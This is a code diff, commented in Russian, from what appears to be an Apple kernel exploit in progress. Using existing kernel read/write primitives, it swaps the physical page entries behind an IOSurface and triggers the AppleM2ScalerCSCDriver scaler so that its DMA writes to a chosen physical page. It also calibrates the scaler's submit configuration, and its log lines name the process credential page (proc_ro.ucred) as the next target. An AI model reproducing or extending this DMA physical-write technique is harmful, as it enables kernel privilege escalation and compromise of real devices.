@@ -5698,34 +5698,55 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     uint32_t srcID = IOSurfaceGetID(srcS);
     kpNote(r, [NSString stringWithFormat:@"  surfaces: srcID=%u dstID=%u (подменяем backing у dst)", srcID, dstID]);
 
-    // 1.9.113: PIPELINE-контроль ДО подмен. Мы ни разу не проверяли, что
-    // скейлер с TSD=0 вообще пишет — если это молчаливый no-op (валидация
-    // kr=0, execute скипает), ни один swap ничего не покажет. Submit на
-    // НЕтронутом dst → читаем его пиксели из юзерспейса.
+    // 1.9.114 (раунд 15): DVA кэшируется при ПЕРВОМ wire поверхности — подмена
+    // должна стоять ДО первого submit настоящего dst. Поэтому калибровка TSD
+    // идёт на ВЫКИДНЫХ поверхностях (какой rect-оффсет даёт реальный DMA), а
+    // настоящий dst не сабмитится до подмены. kr=0 ≠ DMA: нулевые rect'ы →
+    // execute молча скипает — поэтому перебираем оффсеты {0,0,32,32}-пар.
+    uint8_t tsdGood[0x1B0];
+    memset(tsdGood, 0, sizeof(tsdGood));
+    BOOL tsdOK = NO;
     {
+        IOSurfaceRef calS = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+        IOSurfaceRef calD = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
         io_service_t svc0 = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                         IOServiceMatching("AppleM2ScalerCSCDriver"));
-        if (svc0) {
+        if (calS && calD && svc0) {
+            uint32_t calSrcID = IOSurfaceGetID(calS);
+            uint32_t calDstID = IOSurfaceGetID(calD);
             io_connect_t conn0 = 0;
             if (IOServiceOpen(svc0, mach_task_self(), 0, &conn0) == KERN_SUCCESS && conn0) {
-                uint8_t tsd0[0x1B0];
-                memset(tsd0, 0, sizeof(tsd0));
-                *(uint32_t *)(tsd0 + 0) = srcID;
-                *(uint32_t *)(tsd0 + 4) = dstID;
-                kern_return_t pkr = IOConnectCallMethod(conn0, 1, NULL, 0, tsd0, sizeof(tsd0), NULL, NULL, NULL, NULL);
-                kpNote(r, [NSString stringWithFormat:@"  PIPELINE-контроль submit (нет подмены): kr=0x%x", pkr]);
+                for (uint32_t base = 0x0C; base <= 0x40 && !tsdOK; base += 4) {
+                    uint8_t t[0x1B0];
+                    memset(t, 0, sizeof(t));
+                    *(uint32_t *)(t + 0) = calSrcID;
+                    *(uint32_t *)(t + 4) = calDstID;
+                    // пара rect'ов {x=0,y=0,w=32,h=32} в base и base+0x10
+                    *(uint32_t *)(t + base + 0x8) = 32;
+                    *(uint32_t *)(t + base + 0xC) = 32;
+                    *(uint32_t *)(t + base + 0x18) = 32;
+                    *(uint32_t *)(t + base + 0x1C) = 32;
+                    kern_return_t ckr = IOConnectCallMethod(conn0, 1, NULL, 0, t, sizeof(t), NULL, NULL, NULL, NULL);
+                    usleep(60000);
+                    IOSurfaceLock(calD, 0, NULL);
+                    uint32_t *pxc = (uint32_t *)IOSurfaceGetBaseAddress(calD);
+                    int nz = 0;
+                    if (pxc) for (int i = 0; i < 1024; i++) if (pxc[i]) nz++;
+                    IOSurfaceUnlock(calD, 0, NULL);
+                    if (nz) {
+                        memcpy(tsdGood, t, sizeof(tsdGood));
+                        tsdOK = YES;
+                        kpNote(r, [NSString stringWithFormat:@"  TSD-калибровка: DMA ПОШЁЛ с rect @ +%#x (kr=0x%x, nz=%d) — конфиг снят", base, ckr, nz]);
+                    }
+                }
                 IOServiceClose(conn0);
             }
-            IOObjectRelease(svc0);
         }
-        usleep(100000);
-        IOSurfaceLock(dstS, 0, NULL);
-        uint32_t *px0 = (uint32_t *)IOSurfaceGetBaseAddress(dstS);
-        int nz = 0;
-        if (px0) for (int i = 0; i < 1024; i++) if (px0[i]) nz++;
-        IOSurfaceUnlock(dstS, 0, NULL);
-        kpNote(r, [NSString stringWithFormat:@"  PIPELINE-контроль: ненулевых dword в dst после submit = %d %@", nz,
-                  nz ? @"— скейлер РАБОТАЕТ с TSD=0 (DMA идёт, значит DVA кэш/другое поле)" : @"— DMA НЕ ИДЁТ вообще (TSD=0 no-op), swap-тесты ни о чём"]);
+        if (!tsdOK)
+            kpNote(r, @"  TSD-калибровка: DMA не пошёл ни на одном оффсете rect — swap вслепую, шанс низкий");
+        if (calS) CFRelease(calS);
+        if (calD) CFRelease(calD);
+        if (svc0) IOObjectRelease(svc0);
     }
 
     // control page: marker-filled, we own it; get its PA through our own pmap
@@ -5829,70 +5850,72 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         return r;
     }
 
-    // 4. per-hit: подмена → submit → проверка контрольной → restore.
-    //    Попаданий может быть несколько (кэш объекта + дескриптор) — тестируем
-    //    по одному, так узнаём, какое поле реально питает DMA.
+    // 4. подменяем ВСЕ найденные поля сразу, ДО первого submit dst (раунд 15:
+    //    DVA кэшируется при первом wire — per-hit по одному + ранний submit
+    //    отравлял кэш оригиналом). Затем ОДИН submit с откалиброванным TSD,
+    //    проверка контрольной, restore всех.
     io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                    IOServiceMatching("AppleM2ScalerCSCDriver"));
-    int confirmed = -1;
+    uint64_t origQ[8];
+    int swapped = 0;
     for (int h = 0; h < hitN; h++) {
         uint64_t hv = hitVAs[h];
-        int form = hitHalf[h];   // 0=pfn-lo, 1=pfn-hi, 2=raw PA
-        uint64_t origQ = 0, newQ = 0;
-        kreadbuf(hv, &origQ, 8);
+        int form = hitHalf[h];
+        origQ[h] = 0;
+        uint64_t newQ = 0;
+        kreadbuf(hv, &origQ[h], 8);
         if (form == 2) {
-            if (origQ != backingPA) {
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ]);
+            if (origQ[h] != backingPA) {
+                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ[h]]);
                 continue;
             }
             newQ = ctlPA;
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА raw %#018llx → %#018llx (контрольная)", h, (unsigned long long)origQ, (unsigned long long)newQ]);
         } else {
-            uint32_t cur = form ? (uint32_t)(origQ >> 32) : (uint32_t)origQ;
+            uint32_t cur = form ? (uint32_t)(origQ[h] >> 32) : (uint32_t)origQ[h];
             if (cur != pfn32) {
                 kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: половина уже не наш pfn (%#x) — пропуск", h, (unsigned long long)hv, cur]);
                 continue;
             }
-            // пишем ТОЛЬКО совпавшую половину (вторая — вероятно счётчик страниц)
-            newQ = form ? ((origQ & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
-                        : ((origQ & 0xFFFFFFFF00000000ULL) | ctlPFN);
-            kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (pfn %#x → %#x, %s32)",
-                      h, (unsigned long long)origQ, (unsigned long long)newQ, pfn32, ctlPFN, form ? "hi" : "lo"]);
+            // пишем ТОЛЬКО совпавшую половину (вторая — счётчик страниц)
+            newQ = form ? ((origQ[h] & 0xFFFFFFFFULL) | ((uint64_t)ctlPFN << 32))
+                        : ((origQ[h] & 0xFFFFFFFF00000000ULL) | ctlPFN);
         }
         kwritebuf(hv, &newQ, 8);
         uint64_t rb = 0;
         kreadbuf(hv, &rb, 8);
-        kpNote(r, [NSString stringWithFormat:@"  readback = %#018llx %@", (unsigned long long)rb, rb == newQ ? @"— ПРИЛИПЛО" : @"— НЕ прилипло"]);
-        if (svc) {
-            io_connect_t conn = 0;
-            kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
-            if (skr == KERN_SUCCESS && conn) {
-                uint8_t tsd[0x1B0];
-                memset(tsd, 0, sizeof(tsd));
-                *(uint32_t *)(tsd + 0) = srcID;
-                *(uint32_t *)(tsd + 4) = dstID;
-                skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
-                kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1): kr=0x%x (%s)", skr, mach_error_string(skr)]);
-                IOServiceClose(conn);
-            }
-        }
-        usleep(100000);   // DMA докручивается
-        int changed = 0;
-        for (uint32_t i = 0; i < 0x4000; i += 4) {
-            uint32_t px = *(volatile uint32_t *)(ctl + i);
-            if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
-        }
-        kwritebuf(hv, &origQ, 8);   // restore сразу — не оставляем коррупцию
-        if (changed) {
-            confirmed = h;
-            kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: hit #%d @ %#llx — контрольная страница изменена DMA (%u dword). Дальше цель = страница proc_ro.ucred ===",
-                      h, (unsigned long long)hv, changed]);
-            break;
-        }
-        kpNote(r, [NSString stringWithFormat:@"  hit #%d: контрольная не изменилась — restore, следующий", h]);
+        kpNote(r, [NSString stringWithFormat:@"  hit #%d: ПОДМЕНА %#018llx → %#018llx (форма %d) — readback %@",
+                  h, (unsigned long long)origQ[h], (unsigned long long)newQ, form, rb == newQ ? @"ПРИЛИПЛО" : @"НЕ прилипло"]);
+        swapped++;
     }
-    if (confirmed < 0)
-        kpNote(r, @"=== ни одно поле не питает DMA (или DART отказал) — см. выше ===");
+    kpNote(r, [NSString stringWithFormat:@"  подменено полей: %d — ПЕРВЫЙ submit dst (wire прочитает подмену)", swapped]);
+    if (swapped && svc) {
+        io_connect_t conn = 0;
+        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (skr == KERN_SUCCESS && conn) {
+            uint8_t tsd[0x1B0];
+            memcpy(tsd, tsdGood, sizeof(tsd));   // откалиброванный конфиг
+            *(uint32_t *)(tsd + 0) = srcID;
+            *(uint32_t *)(tsd + 4) = dstID;
+            skr = IOConnectCallMethod(conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
+            kpNote(r, [NSString stringWithFormat:@"  scaler submit (sel 1, TSD %s): kr=0x%x (%s)",
+                      tsdOK ? "калиброван" : "нулевой", skr, mach_error_string(skr)]);
+            IOServiceClose(conn);
+        }
+    }
+    usleep(150000);   // DMA докручивается
+    int changed = 0;
+    for (uint32_t i = 0; i < 0x4000; i += 4) {
+        uint32_t px = *(volatile uint32_t *)(ctl + i);
+        if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
+    }
+    // restore всех подменённых — не оставляем коррупцию
+    for (int h = 0; h < hitN; h++)
+        if (origQ[h]) kwritebuf(hitVAs[h], &origQ[h], 8);
+    if (changed) {
+        kpNote(r, [NSString stringWithFormat:@"=== PHYSWRITE DMA CONFIRMED: контрольная страница изменена DMA (%u dword) — подмена page-list ДО wire РАБОТАЕТ. Дальше цель = страница proc_ro.ucred ===", changed]);
+    } else {
+        kpNote(r, @"=== контрольная не изменилась (submit до wire, TSD, или DART отказал) — см. выше ===");
+    }
     if (svc) IOObjectRelease(svc);
     free(ctl);
     return r;
